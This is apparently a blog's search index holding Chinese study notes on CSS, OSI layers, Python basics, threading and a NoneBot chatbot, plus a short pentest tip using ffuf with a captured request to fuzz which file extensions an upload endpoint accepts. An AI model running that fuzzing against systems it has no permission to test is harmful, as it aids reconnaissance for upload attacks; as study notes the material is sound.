<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSS</title>
    <url>/2022/10/26/2022-10-26-CSS/</url>
    <content><![CDATA[<h1 id="什么是-CSS"><a href="#什么是-CSS" class="headerlink" title="什么是 CSS?"></a>什么是 CSS?</h1><ul>
<li><p>CSS 指层叠样式表 (Cascading Style Sheets)</p>
</li>
<li><p>1 样式定义如何显示 HTML 元素</p>
</li>
<li><p>2 样式通常存储在样式表中</p>
</li>
<li><p>3 把样式添加到 HTML 4.0 中，是为了解决内容与表现分离的问题</p>
<ul>
<li>外部样式表可以极大提高工作效率</li>
<li>外部样式表通常存储在 CSS 文件中</li>
<li>多个样式定义可层叠为一个</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML</title>
    <url>/2022/10/26/2022-10-26-HTML/</url>
    <content><![CDATA[<h1 id="html"><a href="#html" class="headerlink" title="html"></a>html</h1><p>然后忘了要写什么了。</p>
]]></content>
  </entry>
  <entry>
    <title>速出文件扩展名</title>
    <url>/2022/10/26/2022-10-26-%E9%80%9F%E5%87%BA%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D/</url>
    <content><![CDATA[<h1 id="快速找出文件上传支持的扩展名"><a href="#快速找出文件上传支持的扩展名" class="headerlink" title="快速找出文件上传支持的扩展名"></a>快速找出文件上传支持的扩展名</h1><h2 id="1-抓包"><a href="#1-抓包" class="headerlink" title="1.抓包"></a>1.抓包</h2><p>使用BurpSuite将抓包的上传文件请求导出，存为譬如<strong>fuzz.txt</strong>的文件</p>

<h2 id="2-修改内容"><a href="#2-修改内容" class="headerlink" title="2.修改内容"></a>2.修改内容</h2><p>对其中进行<strong>模糊测试</strong>的内容修改</p>
<p>将其修改为 <strong>FUZZ</strong> 而在其后跑的字典会替换这里的<strong>FUZZ</strong>关键词</p>


<h2 id="3-字典小爆破"><a href="#3-字典小爆破" class="headerlink" title="3.字典小爆破"></a>3.字典小爆破</h2><p>使用一个包含各种后缀名的字典开始跑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -request fuzz.txt -request-proto http -w /opt/SecLists/Fuzzing/extensions-most-common.fuzz.txt</span><br></pre></td></tr></table></figure>

<p>响应结果如图：</p>

<p>主要区别是Size的大小，这里有1115和1110两种。
可以看成1110是被允许的文件扩展名。</p>
<h2 id="4-优化命令"><a href="#4-优化命令" class="headerlink" title="4.优化命令"></a>4.优化命令</h2><p>增添 -ms 1110</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -request fuzz.txt -request-proto http -w /opt/SecLists/Fuzzing/extensions-most-common.fuzz.txt -ms 1110</span><br></pre></td></tr></table></figure>
<p>现在仅显示支持的扩展名了</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>文件系统</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全基础</title>
    <url>/2022/10/28/2022-10-28-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>1.网络协议本身的逻辑漏洞
2.通过网络分析工具，窃取
3.应用场景中网络协议的不同逻辑错误
4.基主机，操作系统，通信层，应用层</p>
<p>协议：
ARP协议：根据IP获取物理地址，无法在对等网络中解析数据包的来源</p>
<p>ARP欺骗：
通过MAC地址与目标IP相关联。以便于攻击者可以接收到与目标的任何？</p>
<p>2.DNS
 可将域名解析为IP
 缓存中毒，DNS欺骗</p>
<p>3.IP协议
  根据端到端的设计原则，IP为主机提供一种无连接、不可靠、尽力而为的数据包传输服务。
  吧发送的IP包中的源IP地址 改成被新人的友好主机的IP地址，进而实施攻击。</p>
<p>4.远程桌面协议 RDP
  RDP漏洞攻击，不用任何交互绕过认证，直接通过RDP协议进行连接，进而发送恶意代码。</p>
<p>5.简单邮件传输协议（SMTP）
通过电子邮件，发送垃圾软件和电子邮件。执行目录攻击，收集有效电子邮件。
根据漏洞进行缓冲区溢出攻击，特洛伊木马攻击和shell脚本攻击等，还可利用电子邮件发送垃圾邮件或恶意软件。</p>
<h1 id="软件和硬件的漏洞"><a href="#软件和硬件的漏洞" class="headerlink" title="软件和硬件的漏洞"></a>软件和硬件的漏洞</h1><p>1.软件
系统软件
应用软件
数据库软件</p>
<p>软件错误，软件缺陷，软件失效</p>
<p>2.硬件，通过通信线路传输，传输过程中也可能被截取
3.电磁波辐射中的信息也可能被接受
4.水电，空调，中断，会影响系统运行</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>概念</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 复习笔记（一）</title>
    <url>/2022/10/29/2022-10-29-Python%20%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="一、了解python"><a href="#一、了解python" class="headerlink" title="一、了解python"></a>一、了解python</h1><p>Python 是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。</p>
<p>Python 的设计具有很强的可读性，相比其他语言经常使用英文关键字，其他语言的一些标点符号，它具有比其他语言更有特色语法结构。</p>
<ul>
<li><p><strong>菜鸟教程的解释</strong>：</p>
</li>
<li><p><strong>Python 是一种解释型语言</strong>： 这意味着开发过程中没有了编译这个环节。类似于PHP和Perl语言。</p>
</li>
<li><p><strong>Python 是交互式语言</strong>： 这意味着，您可以在一个 Python 提示符 &gt;&gt;&gt; 后直接执行代码。</p>
</li>
<li><p><strong>Python 是面向对象语言</strong>: 这意味着Python支持面向对象的风格或代码封装在对象的编程技术。</p>
</li>
<li><p><strong>Python 是初学者的语言</strong>：Python 对初级程序员而言，是一种伟大的语言，它支持广泛的应用程序开发，从简单的文字处理到 WWW 浏览器再到游戏。</p>
</li>
<li><p><strong>我的理解</strong>：首先python本身是一种高级语言，然后python的解释器会自动的将python源代码解释成计算机使用的机器语言运行。</p>
</li>
<li><p>Python 拥有自己的shell，可以交互式的调用解释器去运行自己的程序。</p>
</li>
<li><p>Python 是一个方便的面向对象语言，因为在设计之初便是一个面向对象的语言。</p>
</li>
<li><p>Python 是一门易上手的语言，他的语法和程序结构相对的简易，俗称简单易上手。</p>
</li>
</ul>
<h2 id="Python的缺点："><a href="#Python的缺点：" class="headerlink" title="Python的缺点："></a><strong>Python的缺点</strong>：</h2><ul>
<li>运转速度慢：Python的解释器需要在运行的适合去翻译自己的源代码，同时去管理底层细节，比如内存的管理，所以相对C和JAVA，Python要慢的多。</li>
<li>Python对多处理器的利用不充分：</li>
<li>由于具有名为全局解释器锁（global interpreter lock，GIL） 的特性，Python的标准版本并没有按照多内核来进行设计。尽管用Python可以运行并发进程，但如果需要“开箱即用”的并发能力，Python可能并不合适。</li>
<li>Python在编译时不检查变量类型</li>
<li>与某些其他编程语言不同，Python变量不像容器那样工作，而更像是引用整数、字符串、类实例等各类对象的标签。这表示这些对象本身虽然是有类型的，但引用它们的变量并没有与类型进行绑定。变量x可能在某一行代码中引用一个字符串，而在另一行代码中引用一个整数：Python将类型与对象关联，而不是与变量关联，这就导致Python解释器无法识别出变量类型不符的错误。假设变量count本来是用来保存整数的，但如果将字符串”two”赋给它，在Python里也完全没问题。这个问题让代码失去了一次免费的检错机会，但是实现了动态类型的灵活性。<blockquote><p>百度百科：Python解释器把源代码转换成称为字节码的中间形式，然后再把它翻译成计算机使用的机器语言并运行。</p>
<footer><strong>@百度百科</strong><cite><a href="https://baike.baidu.com/item/Python/407313?fr=aladdin">baike.baidu.com/item/Python/407313?fr=aladdin</a></cite></footer></blockquote></li>
</ul>
<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>默认情况下，Python 3 源码文件以 UTF-8 编码，所有字符串都是 unicode 字符串。 </p>
<blockquote><p>UTF-8（8位元，Universal Character Set&#x2F;Unicode Transformation Format）是针对Unicode的一种可变长度字符编码。它可以用来表示Unicode标准中的任何字符，而且其编码中的第一个字节仍与ASCII相容，使得原来处理ASCII字符的软件无须或只进行少部分修改后，便可继续使用。因此，它逐渐成为电子邮件、网页及其他存储或传送文字的应用中，优先采用的编码。</p>
<footer><strong>@百度百科</strong><cite><a href="https://baike.baidu.com/item/UTF-8/481798?fr=aladdin">baike.baidu.com/item/UTF-8/481798?fr=aladdin</a></cite></footer></blockquote>


<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><ul>
<li>标识符:</li>
<li>第一个字符必须是字母表中字母或下划线 _ 。</li>
<li>标识符的其他的部分由字母、数字和下划线组成。</li>
<li>标识符对大小写敏感。</li>
</ul>
<p>PS: 在 Python 3 中，可以用中文作为变量名，非 ASCII 标识符也是允许的了。 </p>
<p>#二、 Python基础语法</p>
<h2 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello,world"></a>Hello,world</h2><p>老规矩，对世界的第一声呼唤！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3 #这里说明了python解释器的路径（写死了）</span></span><br><span class="line"><span class="comment">#也可以写作#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#这样python文件会自动的去寻找解释器，增强了代码可移植性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python的输出语句，输出括号内的内容</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Hello, World!&quot;</span>) <span class="comment">#这是一个注释</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello,World!</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>LOVE酱使用手册</title>
    <url>/2022/10/30/2022-10-30-LOVE_HELP/</url>
    <content><![CDATA[<ul>
<li><p>LOVE酱的使用文档</p>
</li>
<li><p>基础功能</p>
</li>
<li><p>聊天系统</p>
</li>
<li><p>教程系统</p>
</li>
<li><p>查询系统</p>
</li>
<li><p>约战系统</p>
</li>
<li><p>音乐系统</p>
</li>
<li><p>色图系统</p>
</li>
</ul>
]]></content>
      <categories>
        <category>LOVE酱</category>
      </categories>
      <tags>
        <tag>Bot</tag>
        <tag>LOVE酱</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 复习笔记（二）</title>
    <url>/2022/10/30/2022-10-30-Python%20%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本章主要简述了Python代码的写法和结构</p>
<h2 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h2><blockquote><p> Python最具特色的就是使用缩进来表示代码块，不需要使用大括号 {} 。
缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数。</p>
<footer><strong>@菜鸟教程</strong><cite><a href="https://www.runoob.com/python3/python3-basic-syntax.html">www.runoob.com/python3/python3-basic-syntax.html</a></cite></footer></blockquote>

<p>  Python利用缩进来区分了代码块，在一段代码中，同一空格数的代码会被分为同一代码块中。</p>
<h2 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h2><p>  在Python中，我们可以将一段很长的代码利用反斜杠分为多行语句，这不会影响解释器的阅读。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">total = item_one + \</span><br><span class="line">       item_two + \</span><br><span class="line">       item_three</span><br></pre></td></tr></table></figure>

<p>  而如果语句被抱在例如 [], {}, 或 () 的这些括号中，则不需要使用\。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">otal = [<span class="string">&#x27;item_one&#x27;</span>, <span class="string">&#x27;item_two&#x27;</span>, <span class="string">&#x27;item_three&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;item_four&#x27;</span>, <span class="string">&#x27;item_five&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h2 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h2><p>懒得写了</p>
<blockquote><p>函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。
空行与代码缩进不同，空行并不是 Python 语法的一部分。书写时不插入空行，Python 解释器运行也不会出错。但是空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护或重构。
<strong>记住：空行也是程序代码的一部分。</strong></p>
<footer><strong>@菜鸟教程</strong><cite><a href="https://www.runoob.com/python3/python3-basic-syntax.html">www.runoob.com/python3/python3-basic-syntax.html</a></cite></footer></blockquote>

<h2 id="代码分隔符"><a href="#代码分隔符" class="headerlink" title="代码分隔符 ;"></a>代码分隔符 ;</h2><p>  在同一行中，我们也可以写多段代码，只需使用 ; 隔开即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;二月&quot;</span>);<span class="built_in">print</span>(<span class="string">&quot;NB&quot;</span>);<span class="built_in">print</span>(<span class="string">&quot;666~&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="代码组"><a href="#代码组" class="headerlink" title="代码组"></a>代码组</h2><p>  缩进相同的一个语句构成一个代码块，缩进相同的多个语句构成一个代码组。</p>
<blockquote><p>像if、while、def和class这样的复合语句，首行以关键字开始，以冒号( : )结束，该行之后的一行或多行代码构成代码组。
我们将首行及后面的代码组称为一个子句(clause)。</p>
<footer><strong>@菜鸟教程</strong><cite><a href="https://www.runoob.com/python3/python3-basic-syntax.html">www.runoob.com/python3/python3-basic-syntax.html</a></cite></footer></blockquote>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>网络七层协议OSI</title>
    <url>/2022/10/31/2022-10-31-7%E5%B1%82/</url>
    <content><![CDATA[<h2 id="物理层（或称物理层，Physical-Layer）"><a href="#物理层（或称物理层，Physical-Layer）" class="headerlink" title="物理层（或称物理层，Physical Layer）"></a>物理层（或称物理层，Physical Layer）</h2><p>  是计算机网络OSI模型中最低的一层。物理层规定:为传输数据所需要的物理链路创建、维持、拆除，而提供具有机械的，电子的，功能的和规范的特性。简单的说，物理层确保原始的数据可在各种物理媒体上传输。局域网与广域网皆属第1、2层。物理层是OSI的第一层，它虽然处于最底层，却是整个开放系统的基础。物理层为设备之间的数据通信提供传输媒体及互连设备，为数据传输提供可靠的环境。如果您想要用尽量少的词来记住这个第一层，那就是“信号和介质”。OSI采纳了各种现成的协议，其中有RS-232、RS-449、X.21、V.35、ISDN、以及FDDI、IEEE802.3、IEEE802.4、和IEEE802.5的物理层协议。 </p>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>  定义了在单个链路上如何传输数据。这些协议与被讨论的各种介质有关。示例：ATM，FDDI等。数据链路层必须具备一系列相应的功能，主要有：如何将数据组合成数据块，在数据链路层中称这种数据块为帧，帧是数据链路层的传送单位；如何控制帧在物理信道上的传输，包括如何处理传输差错，如何调节发送速率以使与接收方相匹配；以及在两个网络实体之间提供数据链路通路的建立、维持和释放的管理。
物理链路（物理线路）：是由传输介质与设备组成的。原始的物理传输线路是指没有采用高层差错控制的基本的物理传输介质与设备。
数据链路（逻辑线路）：在一条物理线路之上，通过一些规程或协议来控制这些数据的传输，以保证被传输数据的正确性。实现这些规程或协议的硬件和软件加到物理线路，这样就构成了数据链路，从数据发送点到数据接收点所经过的传输途径。当采用复用技术时，一条物理链路上可以有多条数据链路。</p>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>  是OSI参考模型中的第三层，介于传输层和数据链路层之间，它在数据链路层提供的两个相邻端点之间的数据帧的传送功能上，进一步管理网络中的数据通信，将数据设法从源端经过若干个中间节点传送到目的端，从而向传输层提供最基本的端到端的数据传送服务。主要内容有：虚电路分组交换和数据报分组交换、路由选择算法、阻塞控制方法、X.25协议、综合业务数据网（ISDN）、异步传输模式（ATM）及网际互连原理与实现。</p>
<h2 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h2><p>  层是整个网络体系结构中的关键层次之一，主要负责向两个主机中进程之间的通信提供服务。由于一个主机同时运行多个进程，因此运输层具有复用和分用功能。传输层在终端用户之间提供透明的数据传输，向上层提供可靠的数据传输服务。传输层在给定的链路上通过流量控制、分段&#x2F;重组和差错控制来保证数据传输的可靠性。传输层的一些协议是面向链接的，这就意味着传输层能保持对分段的跟踪，并且重传那些失败的分段。</p>
<h2 id="会话层-表示层-应用层"><a href="#会话层-表示层-应用层" class="headerlink" title="会话层,表示层,应用层"></a>会话层,表示层,应用层</h2><p>  构成开放系统的高3层，面对应用进程提供分布处理，对话管理,信息表示,恢复最后的差错等. 会话层同样要担负应用进程服务要求，而运输层不能完成的那部分工作,给运输层功能差距以弥补.主要的功能是对话管理，数据流同步和重新同步。要完成这些功能,需要由大量的服务单元功能组合,已经制定的功能单元已有几十种.。如果您想要用尽量少的词来记住这第5层，那就是“对话和交谈”。</p>
<h2 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h2><p>  位于OSI分层结构的第六层，它的主要作用之一是为异种机通信提供一种公共语言，以便能进行互操作。这种类型的服务之所以需要，是因为不同的计算机体系结构使用的数据表示法不同。与第五层提供透明的数据运输不同，表示层是处理所有与数据表示及运输有关的问题，包括转换、加密和压缩。每台计算机可能有它自己的表示数据的内部方法，例如，ASCII码与EBCDIC码，所以需要表示层协定来保证不同的计算机可以彼此理解。</p>
<h2 id="网络七层协议（Open-System-Interconnection）"><a href="#网络七层协议（Open-System-Interconnection）" class="headerlink" title="网络七层协议（Open System Interconnection）"></a>网络七层协议（Open System Interconnection）</h2><p>  简称OSI，是一个开放性的通行系统互连参考模型，他是一个定义的非常好的协议规范。OSI模型有7层结构，每层都可以有几个子层。 OSI的7层从上到下分别是 7 应用层 6 表示层 5 会话层 4 传输层 3 网络层 2 数据链路层 1 物理层 其中高层，即7、6、5、4层定义了应用程序的功能，下面3层，即3、2、1层主要面向通过网络的端到端的数据流。</p>
]]></content>
      <categories>
        <category>计算机网络技术</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 复习笔记（三）</title>
    <url>/2022/10/31/2022-10-31-Python%20%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>  Python 中的变量不需要特意声明类型，只需要在使用前提前赋值。而变量所指向的内存中对象的类型会自动的根据变量所赋值的类型去自动声明。</p>
<p>  等号（&#x3D;）用来给变量赋值。</p>
<h2 id="多变量赋值"><a href="#多变量赋值" class="headerlink" title="多变量赋值"></a>多变量赋值</h2><p>  Python中可以同时给多个变量赋值同一个数，也可以给同时给多个不同的变量赋不同的值。
  如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a = b = c = <span class="number">1</span></span><br><span class="line">a,b,c=<span class="number">1</span>,<span class="number">2</span>,<span class="string">&quot;三&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li>基本数据类型</li>
</ul>
<p>Python3 中有六个标准的数据类型：</p>
<pre><code>-    Number（数字）
-    String（字符串）
-    List（列表）
-    Tuple（元组）
-    Set（集合）
-    Dictionary（字典）
</code></pre>
<p>其中，可分为不可变数据和可变数据:</p>
<ul>
<li><p>不可变数据（3 个）：Number（数字）、String（字符串）、Tuple（元组）；</p>
</li>
<li><p>可变数据（3 个）：List（列表）、Dictionary（字典）、Set（集合）。</p>
</li>
</ul>
<hr>
<ul>
<li><p><strong>Number（数字）</strong>
int：整数
float：浮点数
bool：布尔值
complex：复数</p>
</li>
<li><p><strong>String（字符串）</strong></p>
</li>
<li><p><strong>List（列表）</strong></p>
</li>
<li><p><strong>Set（集合）</strong></p>
</li>
<li><p><strong>Dictionary（字典）</strong></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>NoneBot设置教学功能</title>
    <url>/2022/11/01/2022-11-1-Nonebot%E8%AE%BE%E7%BD%AE%E6%95%99%E5%AD%A6%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<ul>
<li>话不多说，直接上代码
  在之前便设置了读取词库的方法，这样以来设计教学功能便简单许多了。
  原理：
  在事件响应的时候获取原消息纯文件，将命令与教学内容分割
  将教学内容直接写入文件</li>
</ul>
<p>问题：
    初步猜测由于异步编程问题，导致机器人必须重启才可以重新读取词库。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">start=on_command(cmd=<span class="string">&#x27;LOVE教学-&#x27;</span>,priority=<span class="number">50</span>)</span><br><span class="line"><span class="meta">@start.handle()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_func</span>(<span class="params">bot: Bot,event :Event</span>):</span><br><span class="line">   	<span class="keyword">try</span>:</span><br><span class="line">       	teaching=<span class="built_in">open</span>(FilePath(<span class="string">r&#x27;\introduce\cat.ini&#x27;</span>),<span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">       	<span class="comment">#分割消息</span></span><br><span class="line">       	text = <span class="built_in">str</span>(event.get_message()).split(<span class="string">&#x27;-&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">       	teaching.write(<span class="built_in">str</span>(<span class="string">&#x27;\n&#x27;</span>+text[<span class="number">1</span>]))</span><br><span class="line">       	teaching.close()</span><br><span class="line">       	<span class="comment">#import os</span></span><br><span class="line">       	<span class="comment">#os.system(&#x27;exit&#x27;,r&#x27;cd C:\Users\33454\Desktop\LOVE&#x27;,&#x27;nb run&#x27;)</span></span><br><span class="line">       	<span class="keyword">await</span> start.send(<span class="string">&#x27;呐呐呐！教学成功~\n(被添加的新回复将在次日审核通过后才可使用哦~)&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">       	teaching.close()</span><br><span class="line">       	<span class="keyword">await</span> start.send(<span class="string">&#x27;教学失败，请检查命令格式&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>Bot</tag>
      </tags>
  </entry>
  <entry>
    <title>NoneBot读取猫猫词库方法</title>
    <url>/2022/11/01/2022-11-1-Nonebot%E8%AF%BB%E5%8F%96%E7%8C%AB%E7%8C%AB%E8%AF%8D%E5%BA%93%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>#话不多说，直接上代码#
##读取文件的方法##
为了保证Bot的可移植性，将词库文件存在机器人插件目录中，同时使用此函数读取根目录路径，与之相对路径合并，生成绝对路径，保证文件的可读性。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRootPath</span>():</span><br><span class="line">   	<span class="comment"># 获取文件目录</span></span><br><span class="line">   	curPath = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line">   	<span class="comment"># 获取项目根路径，内容为当前项目的名字</span></span><br><span class="line">   	rootPath = curPath[:curPath.find(<span class="string">&#x27;love2&#x27;</span>) + <span class="built_in">len</span>(<span class="string">&#x27;love2&#x27;</span>)]</span><br><span class="line">   	<span class="keyword">return</span> rootPath</span><br><span class="line">FilePath_1=<span class="built_in">str</span>(getRootPath())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(FilePath_1)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FilePath</span>(<span class="params">FilePath_2</span>):<span class="comment">#拼接捏</span></span><br><span class="line">   	FilePath_2=FilePath_1+FilePath_2</span><br><span class="line">   	<span class="keyword">return</span> FilePath_2</span><br></pre></td></tr></table></figure>

<h2 id="将文件生成字典"><a href="#将文件生成字典" class="headerlink" title="将文件生成字典"></a>将文件生成字典</h2><p>主要分为三个步骤：
1.读取文件生成列表
2.读取每个列表利用分割符将每个列表再分成两个列表
3.遍历列表，将每两个列表生成一个字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">FG_2 = []</span><br><span class="line">Fi_1 = <span class="built_in">open</span>(FilePath(<span class="string">r&#x27;\introduce\cat.ini&#x27;</span>))</span><br><span class="line"><span class="comment">#第一步</span></span><br><span class="line">Fi_2 = Fi_1.readlines()</span><br><span class="line"><span class="comment">#第二步</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Fi_2)):</span><br><span class="line">   	FG_1 = Fi_2[i].split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">   	FG_2.append(FG_1[<span class="number">0</span>])</span><br><span class="line">   	FG_2.append(FG_1[<span class="number">1</span>])</span><br><span class="line">   	i = i + <span class="number">1</span></span><br><span class="line"><span class="comment">#第三步</span></span><br><span class="line">zd_1 = &#123;&#125;</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">175</span>:</span><br><span class="line">   	i = i + <span class="number">2</span></span><br><span class="line">   	zd_1[FG_2[i]]=FG_2[i+<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>##无限响应器-处理所有的消息##
读取词库最大的问题在于，如何将每个消息文本都拿去和字典尝试。
经过尝试我找到了如此办法。</p>
<ul>
<li>将on_message的消息反应设置为空，并降低事件响应器优先级。</li>
<li>（降低优先级是为了防止将其他正常的事件响应器盖过）
为什么使用字典：
因为字典读取失败会返回 None,是不会发出任何消息的。
一旦Key找到了对应的键，消息就会返回出来。
基于此机制，代码获得实现，
原理并不复杂，但很好的避免了大量的使用代码设置回复语的代码厄余问题。
上代码：（这里的异常处理是多余的,,小声bb）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">dialogue_1 = on_message(priority=<span class="number">100</span>)<span class="comment">#这里优先级的大小是数值越大便越小</span></span><br><span class="line"><span class="meta">@dialogue_1.handle() </span><span class="comment">#出错</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_func</span>(<span class="params">bot: Bot,event:GroupMessageEvent</span>):</span><br><span class="line">   jsq = zd_1.get(<span class="built_in">str</span>(event.get_message()))</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       <span class="keyword">await</span> dialogue_1.send(jsq)</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;不行喵&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>Bot</tag>
      </tags>
  </entry>
  <entry>
    <title>Python多线程学习</title>
    <url>/2022/11/01/2022-11-1-Python%20%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="认识多线程"><a href="#认识多线程" class="headerlink" title="认识多线程##"></a>认识多线程##</h2><blockquote><p> 多线程类似于同时执行多个不同程序，多线程运行有如下优点：</p>
<ul>
<li>使用线程可以把占据长时间的程序中的任务放到后台去处理。</li>
<li>用户界面可以更加吸引人，比如用户点击了一个按钮去触发某些事件的处理，可以弹出一个进度条来显示处理的进度。</li>
<li>程序的运行速度可能加快。</li>
<li>在一些等待的任务实现上如用户输入、文件读写和网络收发数据等，线程就比较有用了。在这种情况下我们可以释放一些珍贵的资源如内存占用等等。
每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。</li>
</ul>
<p>每个线程都有他自己的一组CPU寄存器，称为线程的上下文，该上下文反映了线程上次运行该线程的CPU寄存器的状态。</p>
<p>指令指针和堆栈指针寄存器是线程上下文中两个最重要的寄存器，线程总是在进程得到上下文中运行的，这些地址都用于标志拥有线程的进程地址空间中的内存。 </p>
<footer><strong>@菜鸟教程</strong><cite><a href="https://www.runoob.com/python3/python3-basic-syntax.html">www.runoob.com/python3/python3-basic-syntax.html</a></cite></footer></blockquote>

<p>总结：
  一、
    1.线程无法独立执行
    2.线程需要入口，执行序列，以及出口。
    3.线程需要主程序来控制。
  二、
    1.线程有独立的寄存器，称为上下文，反应了线程在CPU寄存器的状态。
    2.上下文中包含指令和指针（两个重要的寄存器）。
    3.线程在上下文中运行，内存地址都用于标志拥有线程的进程地址空间中的内存。 
  三、
    1.线程可以被抢占，即中断
    2.其他线程运行时，线程可以暂搁（睡眠）——线程的退让
  四、
    线程可以分为：
    - 内核线程
    - 用户线程
    Python3线程最常用的两个模块为：
    - _thread
    - threading</p>
<p>thread 模块已被废弃。用户可以使用 threading 模块代替。所以，在 Python3 中不能再使用”thread” 模块。为了兼容性，Python3 将 thread 重命名为 “_thread”。</p>
<ul>
<li>Pyton线程学习</li>
<li>Python使用线程的方式有两种：函数 或者 类 包装线程对象</li>
<li>函数式： 调用 _thread 模块中的start_new_thread()函数来产生新线程。</li>
</ul>
